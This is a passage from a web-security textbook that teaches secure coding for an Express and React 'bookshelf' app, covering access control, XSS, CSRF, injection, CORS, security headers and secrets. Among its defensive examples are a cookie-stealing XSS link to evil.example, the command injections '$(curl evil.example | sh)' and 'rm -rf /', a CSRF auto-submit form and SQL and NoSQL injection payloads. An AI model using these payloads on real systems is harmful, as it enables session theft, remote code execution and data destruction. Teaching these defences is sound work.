**The number-one risk in code: broken access control.** A typical example is an *Insecure Direct Object Reference* (IDOR). The client sends an ID, and the server trusts it without checking ownership:

```javascript
// VULNERABLE: any logged-in user can read any reading list by changing the ID in the URL
router.get('/api/v1/lists/:id', authenticate, async (req, res) => {
  const list = await lists.findById(req.params.id);   // authenticated, but not authorized
  if (!list) return res.status(404).end();
  res.json(list);
});

// FIXED: the ownership check is part of the query itself
router.get('/api/v1/lists/:id', authenticate, async (req, res) => {
  const list = await lists.findOne({
    _id: req.params.id,
    ownerId: req.user.id,                             // the user ID comes from the verified session, never the request
  });
  if (!list) return res.status(404).end();            // 404, not 403: do not confirm that someone else's list exists
  res.json(list);
});
```

Authentication answers "who are you?"; authorization answers "may you do *this* to *this* object?" (10.3). Hiding a button in the UI is not authorization. The server must check permissions on every request, because an attacker can call the API directly with `curl`.

**Thinking like an attacker: threat modelling.** The Top Ten tells you *what* usually goes wrong; threat modelling tells you *where* it could go wrong in your system. A lightweight version is to draw the data flows, mark each **trust boundary** (where data crosses from a less trusted to a more trusted zone), and ask at each boundary what could be spoofed, tampered with or leaked:

```text
  Untrusted                     |        Trusted (your infrastructure)
                                |
  Browser / mobile app  --HTTPS-->  Reverse proxy --> Express API --> MongoDB
     ^ user input,              |        |                |   \
     | URL, headers,            |   TLS, rate limit   validate,   \--> Redis
     | cookies, files           |                     authorize,
                                |                     encode output
            trust boundary: every value crossing it is attacker-controlled
```

**Defence in depth.** No single control is perfect, so you layer them. For example, against XSS you combine input validation, output encoding, a Content Security Policy and `HttpOnly` cookies. If one layer fails, the next one limits the damage.

**Key Takeaways**

- The OWASP Top Ten lists the most common categories of web application weakness; use it as a checklist and a shared vocabulary, and the ASVS for detailed requirements.
- Broken access control is the most common weakness: enforce authorization on the server, on every request, and scope data queries to the current user.
- Treat everything that crosses a trust boundary (body, query, headers, cookies, files) as attacker-controlled.
- Layer independent defences so that one failure does not become a breach.

> **Practice**
>
> 1. *(Beginner)* For each of the ten categories, write one concrete example of how it could appear in the bookshelf API (for example, "A02: the error handler returns `err.stack` in production").
> 2. *(Intermediate)* Audit the routes of your bookshelf API for IDOR: list every route that takes an ID and verify that the query checks ownership or role. Write a supertest test for each route in which user B requests user A's resource and expects `404`.
> 3. *(Interview)* "Your API checks a JWT on every route. Is it secure against broken access control?" *Hint:* distinguish verifying *who* the caller is from checking *what* they may do with a specific resource; think about IDs in URLs and role checks on admin routes.

#### Cross-Site Scripting and Output Encoding

**Why XSS is so dangerous.** The browser runs every script on a page with the full privileges of that page's origin. It cannot tell whether a script was written by you or injected by an attacker. If an attacker manages to place `<script>` into your page, their code can read the DOM, call your API with the user's cookies, change what the user sees, capture keystrokes and send everything to their own server. **Cross-site scripting** (XSS) is exactly that: attacker-controlled data ends up being interpreted as code in another user's browser.

An analogy: a stage actor reads lines from a script. If an audience member can slip a page into the script, the actor will read it out loud with the same authority as the playwright's lines. Output encoding makes sure that whatever the audience writes is read out as a quotation, never as stage directions.

**The three kinds of XSS.**

| Kind | Where the payload lives | Example |
|---|---|---|
| Stored | In your database; served to every viewer | A book review containing `<script>...</script>` shown on the book page |
| Reflected | In the request (usually the URL); echoed back immediately | `/search?q=<script>...</script>` rendered as "Results for ..." |
| DOM-based | Never reaches the server; client JavaScript writes it into the DOM | `el.innerHTML = location.hash.slice(1)` |

**A vulnerable page.** An Express route that builds HTML by concatenation:

```javascript
// VULNERABLE: the query parameter is inserted into HTML as markup
app.get('/search', (req, res) => {
  res.send(`<h1>Results for ${req.query.q}</h1>`);
});
```

A link such as the following steals the user's session if the cookie is not `HttpOnly`:

```text
https://bookshelf.example/search?q=<img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">
```

The `<img>` fails to load, its `onerror` handler runs, and the attacker's server receives the cookie. Attackers rarely use `<script>` tags directly; event-handler attributes, `javascript:` URLs and SVG are equally effective.

**The fix: encode for the output context.** Input validation helps (a quantity must be a number), but you cannot reject every "dangerous" character: a book title can legitimately contain `<`, `"` or `'`. The reliable defence is **output encoding**: when you insert data into a document, convert characters that have special meaning *in that context* into a harmless representation. The right encoding depends on where the data goes:

| Output context | Example | Encoding |
|---|---|---|
| HTML text | `<p>DATA</p>` | HTML entities: `&` `<` `>` become `&amp;` `&lt;` `&gt;` |
| HTML attribute (quoted) | `<input value="DATA">` | HTML entities, including `"` and `'` |
| URL parameter | `<a href="/search?q=DATA">` | `encodeURIComponent`, then HTML-encode the attribute |
| URL as a whole | `<a href="DATA">` | Allow only `http:`/`https:` schemes, then encode |
| JavaScript | `<script>const x = DATA</script>` | Avoid; pass data via a `data-` attribute or JSON with `<` escaped |
| CSS | `style="color: DATA"` | Avoid; use an allowlist of values |

A minimal HTML encoder:

```javascript
// Encode text for safe insertion into HTML text or a quoted attribute value
export function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')    // must be first, or it would re-encode the entities below
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

app.get('/search', (req, res) => {
  res.send(`<h1>Results for ${escapeHtml(req.query.q ?? '')}</h1>`);   // now rendered as visible text
});
```

In practice you rarely write this yourself, because the tools you already use encode by default:

| Tool | Safe by default | Escape hatch to watch for |
|---|---|---|
| EJS (12.3) | `<%= value %>` | `<%- value %>` outputs raw HTML |
| Handlebars / Pug | `{{value}}` / `#{value}` | `{{{value}}}` / `!{value}` |
| DOM API | `el.textContent = value`, `setAttribute` | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` |
| jQuery (Chapter 8) | `.text(value)` | `.html(value)`, `$(userString)` |
| React (Chapter 14) | `{value}` in JSX | `dangerouslySetInnerHTML`, `href={userUrl}` with `javascript:` |

**React is not immune.** JSX escapes text, but a user-supplied URL in `href` can still run code:

```jsx
// VULNERABLE: a profile "website" of javascript:alert(document.cookie) runs on click
<a href={user.website}>Website</a>

// SAFER: allow only http(s) URLs
function safeUrl(raw) {
  try {
    const url = new URL(raw);
    return ['http:', 'https:'].includes(url.protocol) ? url.href : '#';
  } catch {
    return '#';                                  // not a valid absolute URL
  }
}
<a href={safeUrl(user.website)} rel="noopener noreferrer">Website</a>
```

**When you must render user HTML.** Rich-text reviews or Markdown previews need real HTML. Do not write your own filter. Use a **sanitizer** such as DOMPurify, which parses the HTML and removes everything outside an allowlist of tags and attributes:

```javascript
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(review.html, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href'],                        // no style, no on* handlers
});
reviewEl.innerHTML = clean;                      // acceptable only because it was sanitized just before
```

**Extra layers.** Mark session cookies `HttpOnly` (10.2) so scripts cannot read them, add a Content Security Policy (later in this section) so injected scripts do not run, and consider **Trusted Types**, a browser feature that makes `innerHTML` and similar sinks reject plain strings unless they have passed through an approved policy.

**Key Takeaways**

- XSS happens when untrusted data is interpreted as code in a victim's browser; it can be stored, reflected or DOM-based.
- The primary defence is context-aware output encoding at the point of output, not filtering input.
- Prefer APIs that are safe by default (`textContent`, `<%= %>`, JSX text) and review every escape hatch (`innerHTML`, `<%- %>`, `dangerouslySetInnerHTML`).
- Validate URL schemes before putting user URLs in `href` or `src`.
- Sanitize user HTML with a maintained allowlist sanitizer, and add `HttpOnly` cookies and CSP as further layers.

> **Practice**
>
> 1. *(Beginner)* Build the vulnerable `/search` route, trigger an `alert(1)` with the `onerror` payload, then fix it with `escapeHtml` and confirm that the payload appears as text.
> 2. *(Intermediate)* Search the bookshelf React front end and Express views for every use of `innerHTML`, `dangerouslySetInnerHTML`, `<%-` and user-controlled `href`. For each one, either replace it with a safe API or document why the value is trusted or sanitized.
> 3. *(Interview)* "Why is output encoding preferred over input filtering as an XSS defence?" *Hint:* consider that the same data may be output in different contexts (HTML, attribute, URL, JSON), and that legitimate data can contain special characters.

#### Cross-Site Request Forgery and Tokens

**Why CSRF exists.** Browsers attach cookies to every request sent to a site, no matter which page started the request. If you are logged in to `bookshelf.example` and you visit `evil.example`, a hidden form on the evil page can submit a POST to `bookshelf.example`, and your browser will include your session cookie. The server sees a valid session and performs the action. **Cross-Site Request Forgery** (CSRF) tricks an authenticated browser into sending a request the user never intended.

An analogy: a bank that accepts any cheque that bears your signature stamp. CSRF is someone placing a cheque in front of you while you are holding the stamp, and the stamp comes down automatically.

```text
 1. User logs in        browser ----POST /login----> bookshelf.example
                        browser <--Set-Cookie: sid--
 2. User visits         browser ----GET-----------> evil.example
    a malicious page    browser <-- page with auto-submitting form
 3. Form submits        browser ----POST /api/account/delete, Cookie: sid----> bookshelf.example
                                    (cookie attached automatically)
 4. Server sees a valid session and deletes the account
```

Note what the attacker *cannot* do: thanks to the same-origin policy, they cannot read the response. CSRF is a "blind" write attack. That is why it targets state-changing requests.

**A malicious page.**

```html
<!-- on evil.example -->
<form id="f" action="https://bookshelf.example/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById('f').submit();</script>   <!-- runs as soon as the page loads -->
```

**When you are vulnerable.** CSRF needs three things: the browser sends credentials automatically (cookies, HTTP Basic or client certificates), the action changes state, and the request can be built without knowing any secret. An API that authenticates *only* with an `Authorization: Bearer` header (10.3) is not exposed, because a cross-site page cannot make the browser add that header. Cookie-based sessions are exposed unless you defend them.

**Defences, layered.**

| Defence | How it works | Notes |
|---|---|---|
| Safe methods | GET, HEAD, OPTIONS never change state (10.1) | Prerequisite for every other defence |
| `SameSite` cookies | `SameSite=Lax` or `Strict` stops the cookie on cross-site POSTs (10.2) | Browsers default to `Lax`; does not cover same-*site* attackers such as a vulnerable subdomain |
| Origin / Fetch Metadata check | Reject state-changing requests whose `Origin` is not yours or whose `Sec-Fetch-Site` is `cross-site` | Cheap and effective in modern browsers |
| Synchronizer token | Server stores a random token in the session and requires it in each form or header | Classic defence; the attacker cannot read the token |
| Signed double-submit cookie | Token in a cookie and in a header/field; server checks they match and the signature is valid | Stateless variant for apps without server sessions |
| Custom request header | Require e.g. `X-Requested-With` on API calls | Cross-site forms cannot set custom headers; `fetch` with them triggers a CORS preflight |

**Implementing the defences in Express.** A middleware that checks Fetch Metadata and the origin for every unsafe method, plus a synchronizer token for classic HTML forms:

```javascript
import crypto from 'node:crypto';

const SAFE_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);
const ALLOWED_ORIGINS = new Set(['https://bookshelf.example']);

// Layer 1: reject unsafe requests that clearly come from another site
export function rejectCrossSite(req, res, next) {
  if (SAFE_METHODS.has(req.method)) return next();
  const site = req.get('Sec-Fetch-Site');            // sent by all modern browsers
  if (site && site !== 'same-origin' && site !== 'none') {
    return res.status(403).json({ error: 'cross-site request blocked' });
  }
  const origin = req.get('Origin');
  if (origin && !ALLOWED_ORIGINS.has(origin)) {
    return res.status(403).json({ error: 'bad origin' });
  }
  next();
}

// Layer 2: synchronizer token stored in the session (express-session, 12.3)
export function csrfToken(req, res, next) {
  req.session.csrf ??= crypto.randomBytes(32).toString('base64url');   // one token per session
  res.locals.csrfToken = req.session.csrf;                               // available to templates
  if (SAFE_METHODS.has(req.method)) return next();

  const sent = req.get('X-CSRF-Token') ?? req.body?._csrf ?? '';
  const expected = req.session.csrf;
  const ok = sent.length === expected.length &&
    crypto.timingSafeEqual(Buffer.from(sent), Buffer.from(expected));   // constant-time comparison
  if (!ok) return res.status(403).json({ error: 'invalid CSRF token' });
  next();
}
```

```html
<!-- EJS form: the token travels in a hidden field the attacker cannot read -->
<form method="POST" action="/account/email">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input name="email" type="email">
  <button>Save</button>
</form>
```

For a single-page app, expose the token through an endpoint or a readable cookie and send it in the `X-CSRF-Token` header with every `fetch`. The old `csurf` package is deprecated; use maintained libraries (such as `csrf-csrf` or `csrf-sync`) or the small middleware above.

**Login CSRF.** Even the login form needs protection: an attacker can log the victim into the *attacker's* account, so that the victim's later activity (a saved card, a search history) is recorded where the attacker can see it.

**Key Takeaways**

- CSRF abuses the browser's automatic sending of cookies to perform state-changing requests on the user's behalf; the attacker cannot read the response.
- Keep GET and other safe methods free of side effects.
- Combine `SameSite` cookies with an Origin or `Sec-Fetch-Site` check, and add a token (synchronizer or signed double-submit) for cookie-authenticated forms.
- APIs authenticated only with an `Authorization` header are not exposed to CSRF, but are exposed to token theft through XSS.

> **Practice**
>
> 1. *(Beginner)* Host the malicious form on `http://localhost:4000` and target a cookie-session app on `http://localhost:3000`. Observe whether the cookie is sent with `SameSite=None; Secure`, `Lax` and `Strict`, using the browser's network panel.
> 2. *(Intermediate)* Add `rejectCrossSite` and `csrfToken` to the bookshelf server-rendered views. Write supertest tests for a request without a token (403), with a wrong token (403), with a correct token (success) and with `Sec-Fetch-Site: cross-site` (403).
> 3. *(Interview)* "If all our cookies are `SameSite=Lax`, do we still need CSRF tokens?" *Hint:* think about subdomains being the same site, state-changing GET requests, older browsers, and defence in depth.

#### Injection Attacks and Parameterized Queries

**Why injection happens.** Many systems receive commands as text: a database receives SQL, a shell receives command lines, MongoDB receives query documents. If an application builds that text by pasting in user input, the user can change the *structure* of the command, not just its values. The interpreter cannot tell which parts the developer wrote and which came from the attacker. That is **injection**: data crossing over into code.

An analogy: you dictate a letter to a secretary, ending with "and sign it from the customer, whose name is ...". If the customer gives their name as "Bob. Also transfer all funds to account 666", a secretary who simply writes down whatever follows "whose name is" has been injected.

**SQL injection.** A login query built by string concatenation:

```javascript
// VULNERABLE: user input becomes part of the SQL text
const sql = `SELECT * FROM users WHERE email = '${email}' AND password_hash = '${hash}'`;
```

With `email` set to `admin@bookshelf.example' --`, the query becomes:

```sql
SELECT * FROM users WHERE email = 'admin@bookshelf.example' --' AND password_hash = '...'
--                                                         ^ everything after -- is a comment
```

The password check disappears. Other payloads use `UNION SELECT` to read other tables, or `; DROP TABLE books` where multiple statements are allowed.

**The fix: parameterized queries.** Send the SQL text and the values *separately*. The database parses the statement first, with placeholders, and then binds the values as pure data. No value can change the statement's structure, whatever characters it contains:

```javascript
import pg from 'pg';
const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL });

// $1, $2 are placeholders; values travel separately in the protocol
const { rows } = await pool.query(
  'SELECT id, email, role FROM users WHERE email = $1 AND active = $2',
  [email, true],
);

// mysql2 uses ? placeholders
const [books] = await conn.execute('SELECT * FROM books WHERE author = ? LIMIT ?', [author, 20]);
```

Query builders and ORMs (Knex, Prisma, Sequelize, Drizzle) parameterize for you, as long as you use their normal API. Their "raw" escape hatches (`knex.raw`, `prisma.$queryRawUnsafe`) reintroduce the risk if you interpolate strings into them.

**What cannot be a parameter.** Placeholders work for *values*, not for table names, column names or keywords such as `ASC`/`DESC`. For dynamic sorting, map user input through an allowlist:

```javascript
const SORT_COLUMNS = { title: 'title', year: 'published_year', author: 'author_name' };

function orderBy(sort = 'title', dir = 'asc') {
  const column = SORT_COLUMNS[sort];                    // unknown keys yield undefined
  if (!column) throw new ValidationError('invalid sort field');
  return `ORDER BY ${column} ${dir === 'desc' ? 'DESC' : 'ASC'}`;   // only fixed strings reach the SQL
}
```

**NoSQL injection.** MongoDB queries are objects, not strings, so classic SQL payloads do not work. But JSON bodies can contain objects where you expected strings:

```javascript
// VULNERABLE: express.json() turns {"email":"a@b.c","password":{"$ne":null}} into an object
const user = await users.findOne({ email: req.body.email, password: req.body.password });
// The query becomes { password: { $ne: null } }: "any password that is not null" matches
```

Defend by validating types before querying (12.3), so only strings get through, and by enabling Mongoose's `sanitizeFilter`, which wraps operator-like keys in `$eq`:

```javascript
import { z } from 'zod';

const LoginBody = z.object({
  email: z.string().email(),
  password: z.string().min(1).max(200),          // an object such as {"$ne":null} now fails validation
});

const { email, password } = LoginBody.parse(req.body);
const user = await User.findOne({ email });       // look up by email, then verify the hash (10.3)
const ok = user && await bcrypt.compare(password, user.passwordHash);
```

**Command injection.** Building a shell command from input lets attackers add `; rm -rf /` or `$(curl evil.example | sh)`. As in 11.5, avoid `exec` with interpolated strings and pass an argument array to `execFile` or `spawn`, which do not involve a shell:

```javascript
import { execFile } from 'node:child_process';

// VULNERABLE: exec(`convert ${file} -resize 200x200 thumb.png`)
// SAFER: no shell; the file name is a single argument even if it contains ; or $( )
execFile('convert', [file, '-resize', '200x200', 'thumb.png'], (err) => { /* ... */ });
```

**Other injection families.**

| Interpreter | Vulnerable pattern | Defence |
|---|---|---|
| SQL | String concatenation into queries | Parameterized queries, allowlists for identifiers |
| MongoDB | Objects from JSON bodies used as filters; `$where` with strings | Schema validation, `sanitizeFilter`, never `$where` |
| Shell | `exec` with interpolated input | `execFile`/`spawn` with argument arrays |
| Server-side templates | Compiling user input as a template | Never compile user input; pass it as data |
| HTML / JavaScript | Concatenating into markup (XSS) | Output encoding (previous section) |
| HTTP headers | User input containing `\r\n` in a header | Frameworks reject CR/LF; validate redirects |
| Logs | User input with fake log lines | Structured JSON logging (11.6) |

**Key Takeaways**

- Injection occurs when input changes the structure of a command sent to an interpreter.
- Use parameterized queries for every value; use allowlists for identifiers and keywords.
- In MongoDB, validate that values have the expected primitive types, and never pass request objects directly as filters.
- Never run user input through a shell; use argument arrays.
- ORMs and query builders are safe by default, but their raw-query APIs are not.

> **Practice**
>
> 1. *(Beginner)* With SQLite or PostgreSQL, write a vulnerable login query, bypass it with `' OR '1'='1' --`, then rewrite it with placeholders and show the payload no longer works.
> 2. *(Intermediate)* Add `?sort=` and `?order=` to `GET /api/v1/books` with an allowlist mapping. Then send `{"email":"x","password":{"$ne":null}}` to the bookshelf login route and verify your validation returns 422.
> 3. *(Interview)* "Why can't you protect against SQL injection by escaping quotes yourself?" *Hint:* consider character encodings, numeric contexts without quotes, identifiers, and how parameter binding separates parsing from data.

#### Same-Origin Policy and CORS Misconfiguration

**Why the same-origin policy exists.** Your browser holds cookies and sessions for many sites at once: your bank, your email, the bookshelf app. If any page could freely read responses from any other site, a malicious page could fetch `https://mail.example/inbox` using your cookies and read your mail. The **same-origin policy** (SOP) prevents this: a script may *send* requests anywhere, but it may only *read* responses from its own origin.

An **origin** is the triple *scheme + host + port*:

| URL | Same origin as `https://bookshelf.example`? | Why |
|---|---|---|
| `https://bookshelf.example/api/books` | Yes | Path does not matter |
| `http://bookshelf.example` | No | Different scheme |
| `https://api.bookshelf.example` | No | Different host (but same *site*) |
| `https://bookshelf.example:8443` | No | Different port |

**CORS: a controlled exception.** Legitimate apps often need cross-origin reads: a React app on `https://app.bookshelf.example` calling an API on `https://api.bookshelf.example`. **Cross-Origin Resource Sharing** (CORS) lets the *server* tell the browser which other origins may read its responses. It is a relaxation of SOP, never an extra protection: a server without CORS headers is as locked down as it can be.

```text
Simple request (GET, standard headers):
  Browser --GET /books, Origin: https://app.bookshelf.example--> API
  Browser <--200, Access-Control-Allow-Origin: https://app.bookshelf.example-- API
  Browser lets the script read the response (headers match)

Preflighted request (PUT, JSON body, custom headers):
  Browser --OPTIONS /books/42, Origin, Access-Control-Request-Method: PUT--> API
  Browser <--204, Allow-Origin, Allow-Methods: PUT, Allow-Headers: Content-Type, Max-Age-- API
  Browser --PUT /books/42 (the real request)--> API
```

| Response header | Meaning |
|---|---|
| `Access-Control-Allow-Origin` | The one origin (or `*`) allowed to read the response |
| `Access-Control-Allow-Credentials: true` | The response may be read even when cookies were sent; forbids `*` as origin |
| `Access-Control-Allow-Methods` / `-Headers` | What the preflight approves |
| `Access-Control-Expose-Headers` | Response headers the script may read beyond the safe defaults |
| `Access-Control-Max-Age` | How long the browser may cache a preflight result |
| `Vary: Origin` | Tells caches that the response depends on the `Origin` header |

**Common misconfigurations.** CORS bugs almost always come from trying to make an error go away quickly:

| Misconfiguration | Why it is dangerous |
|---|---|
| Reflecting any `Origin` back, with `Allow-Credentials: true` | Every website can read authenticated responses: equivalent to no SOP for your API |
| Allowing `Origin: null` | Sandboxed iframes and `file:` pages send `null`; attackers can produce it on purpose |
| Weak matching: `origin.endsWith('bookshelf.example')` | `evilbookshelf.example` also matches |
| Unanchored regex: `/bookshelf\.example/` | `bookshelf.example.evil.com` matches |
| Trusting all subdomains | One XSS on a forgotten subdomain can read your API |
| `Access-Control-Allow-Origin: *` on an internal API | Any page a staff member visits can read it through their network position |
| Missing `Vary: Origin` | A CDN may cache a response with one origin's header and serve it to another |

**A safe configuration in Express.** Use an exact allowlist and let the `cors` package (12.2) handle the headers and preflights:

```javascript
import cors from 'cors';

const allowedOrigins = new Set(config.CORS_ORIGINS);   // e.g. ['https://app.bookshelf.example']

app.use('/api', cors({
  origin(origin, callback) {
    // Requests without an Origin header (curl, server-to-server, same-origin GET) are not CORS requests
    if (!origin) return callback(null, true);
    callback(null, allowedOrigins.has(origin));        // exact match only: no endsWith, no regex
  },
  credentials: true,                                    // cookies allowed, so the origin must never be '*'
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  maxAge: 600,                                          // cache preflights for 10 minutes
}));
// The cors package adds Vary: Origin automatically when the origin is dynamic
```

**What CORS does not do.** CORS is enforced by browsers, for browsers. It does not stop `curl`, scripts or other servers from calling your API, so it is not authentication. It also does not block cross-site *sending* of simple requests, so it is not a CSRF defence. Often the cleanest solution is to avoid CORS entirely by serving the front end and API from the same origin through a reverse proxy (12.3, 17.3).

**Key Takeaways**

- An origin is scheme + host + port; SOP stops scripts from reading cross-origin responses, not from sending requests.
- CORS lets a server relax SOP for specific origins; it never adds protection.
- Use exact origin allowlists; never reflect arbitrary origins with credentials, never allow `null`, never match by suffix or unanchored regex.
- Send `Vary: Origin` when the allowed origin varies, and prefer same-origin deployment when possible.

> **Practice**
>
> 1. *(Beginner)* Serve a page on `http://localhost:5173` that fetches `http://localhost:3000/api/books`. Observe the console error without CORS, then add the `cors` middleware with an allowlist and observe the preflight in the network panel.
> 2. *(Intermediate)* Write a test that sends requests with `Origin: https://evil.example`, `Origin: null` and `Origin: https://app.bookshelf.example.evil.com` and asserts that none receive an `Access-Control-Allow-Origin` header.
> 3. *(Interview)* "A colleague fixed a CORS error by setting `origin: true, credentials: true`. What is the risk?" *Hint:* `origin: true` reflects the request's origin; consider what a malicious page could read from a logged-in user's session.

#### Content Security Policy and Security Headers

**Why headers.** Many browser protections are off by default for backward compatibility: old sites depended on inline scripts, framing and loose content sniffing. A server can switch these protections on for its own pages by sending response headers. They do not fix bugs in your code, but they limit what an attacker can do when a bug exists. That makes them a classic defence-in-depth layer.

**Content Security Policy (CSP).** CSP tells the browser where the page may load resources from and which scripts may run. Even if an attacker injects `<script>` or an `onerror` attribute, the browser refuses to execute it if it does not satisfy the policy.

An analogy: CSP is a guest list at the door of a venue. It does not stop people from trying to get in, but anyone whose name (origin or nonce) is not on the list is turned away.

**Main directives.**

| Directive | Controls | Typical value |
|---|---|---|
| `default-src` | Fallback for other fetch directives | `'self'` |
| `script-src` | JavaScript sources | `'self' 'nonce-...' 'strict-dynamic'` |
| `style-src` | Stylesheets | `'self'` (plus a nonce for inline styles) |
| `img-src` | Images | `'self' data: https://covers.example` |
| `connect-src` | `fetch`, XHR, WebSocket destinations | `'self' https://api.bookshelf.example` |
| `frame-ancestors` | Who may embed this page in a frame | `'none'` (anti-clickjacking) |
| `object-src` | Plugins (`<object>`, `<embed>`) | `'none'` |
| `base-uri` | Allowed `<base>` URLs | `'self'` or `'none'` |
| `form-action` | Where forms may submit | `'self'` |
| `upgrade-insecure-requests` | Rewrites `http:` subresource URLs to `https:` | (no value) |
| `report-to` | Where violation reports are sent | A reporting endpoint name |

**Allowlists vs nonces.** Early CSPs listed trusted hosts (`script-src https://cdn.example`). Research showed that most such policies can be bypassed, because allowlisted CDNs host scripts (old libraries, JSONP endpoints) that attackers can abuse. The recommended approach is a **strict CSP** based on **nonces**: the server generates a random value for each response, puts it in the header, and adds it to every legitimate `<script>` tag. Injected scripts cannot know the nonce. `'strict-dynamic'` then lets those trusted scripts load further scripts.

```javascript
import crypto from 'node:crypto';
import helmet from 'helmet';

// 1. A fresh nonce per response
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// 2. helmet sets CSP and the other security headers (12.2)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [(req, res) => `'nonce-${res.locals.cspNonce}'`, "'strict-dynamic'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https://covers.openlibrary.org'],
      connectSrc: ["'self'"],
      objectSrc: ["'none'"],
      baseUri: ["'none'"],
      frameAncestors: ["'none'"],
      formAction: ["'self'"],
    },
  },
  strictTransportSecurity: { maxAge: 63072000, includeSubDomains: true, preload: true },   // 2 years
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

```html
<!-- EJS view: only tags carrying the nonce run -->
<script nonce="<%= cspNonce %>" src="/assets/app.js"></script>
<script nonce="<%= cspNonce %>">window.__CONFIG__ = <%- safeJson(config) %>;</script>  <!-- safeJson: JSON.stringify with < escaped as \u003c -->
```

The resulting header looks like this:

```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-q3h0f...' 'strict-dynamic';
  style-src 'self'; img-src 'self' data: https://covers.openlibrary.org; connect-src 'self';
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'
```

For a static SPA built by Vite, where no server renders the HTML, you can instead use **hashes** (`'sha256-...'` of each inline script, generated at build time) or simply have no inline scripts and use `script-src 'self'`.

**Rolling out CSP safely.** A strict policy can break third-party widgets and inline event handlers (`onclick="..."`, which CSP blocks). Deploy first with `Content-Security-Policy-Report-Only`: the browser reports violations but blocks nothing. Collect the reports, fix the code, then switch to the enforcing header.

**Other security headers.**

| Header | Purpose | Recommended value |
|---|---|---|
| `Strict-Transport-Security` (HSTS) | Browser uses only HTTPS for this host from now on (10.1) | `max-age=63072000; includeSubDomains` |
| `X-Content-Type-Options` | Stop the browser guessing ("sniffing") content types, e.g. treating an upload as script | `nosniff` |
| `X-Frame-Options` | Legacy clickjacking protection (superseded by `frame-ancestors`) | `DENY` |
| `Referrer-Policy` | How much of the URL is sent in `Referer` to other sites | `strict-origin-when-cross-origin` or `no-referrer` |
| `Permissions-Policy` | Disable powerful features the site does not use | `camera=(), microphone=(), geolocation=()` |
| `Cross-Origin-Opener-Policy` | Isolate your window from cross-origin popups | `same-origin` |
| `Cross-Origin-Resource-Policy` | Which sites may embed your resources | `same-origin` or `same-site` |
| `Cache-Control` | Keep authenticated pages out of shared caches | `no-store` for sensitive responses |

Also *remove* headers that only help attackers, such as `X-Powered-By: Express` (helmet does this). Check your result with `curl -I`, the browser's network panel, or online scanners such as Mozilla Observatory.

**Key Takeaways**

- Security headers switch on browser protections that limit the damage of bugs; they complement, not replace, secure code.
- CSP controls which scripts and resources may load; prefer a strict, nonce-based policy with `'strict-dynamic'`, `object-src 'none'` and `base-uri 'none'`.
- Roll CSP out with `Report-Only` first, then enforce.
- Always set HSTS, `X-Content-Type-Options: nosniff`, `frame-ancestors 'none'` (or `X-Frame-Options`) and a sensible `Referrer-Policy`.

> **Practice**
>
> 1. *(Beginner)* Run `curl -I` against three well-known websites and tabulate which security headers each sends. Then do the same for your bookshelf app before and after adding `helmet`.
> 2. *(Intermediate)* Add a nonce-based CSP to the bookshelf EJS views. Inject `<img src=x onerror=alert(1)>` through a deliberately unescaped field and confirm in the console that CSP blocks it. Then deploy the policy in `Report-Only` mode with a `/csp-report` endpoint that logs violations.
> 3. *(Interview)* "Why are nonce-based CSPs recommended over host allowlists?" *Hint:* think about what else is hosted on an allowlisted CDN, JSONP endpoints, and whether an attacker can predict a per-response random value.

#### Secret Management and Secure Configuration

**Why secrets need special handling.** An application needs credentials to work: database passwords, JWT signing keys, API keys for payment or e-mail providers. If these live in the source code, everyone with access to the repository has them, every copy and fork has them, and they stay in the Git history even after you delete the line. Automated bots scan public repositories and use leaked cloud keys within minutes. Secret management is about keeping credentials out of code, giving each component only what it needs, and being able to replace them quickly.

**Configuration vs code.** The *Twelve-Factor App* methodology states that anything that varies between deployments (development, staging, production) is *configuration* and belongs in the **environment**, not in code. The same build artifact then runs everywhere with different settings (17.3). Secrets are the most sensitive part of that configuration.

**Levels of maturity.**

| Approach | Where secrets live | Suitable for |
|---|---|---|
| Hard-coded in source | Git history | Never |
| `.env` file, git-ignored | Developer's disk | Local development |
| Platform environment variables | Hosting dashboard / CI settings | Small apps on a PaaS |
| Orchestrator secrets | Kubernetes Secrets, Docker secrets (mounted files) | Containerised deployments |
| Secret manager | HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault | Production, with auditing, access control and rotation |
| Short-lived dynamic credentials | Generated per workload (Vault database engine, cloud IAM roles, OIDC) | Mature setups: nothing long-lived to leak |

**Local development with `.env`.** Keep a committed `.env.example` that documents every variable with placeholder values, and a git-ignored `.env` with the real ones:

```bash
# .env.example (committed): documents the variables, never contains real values
```
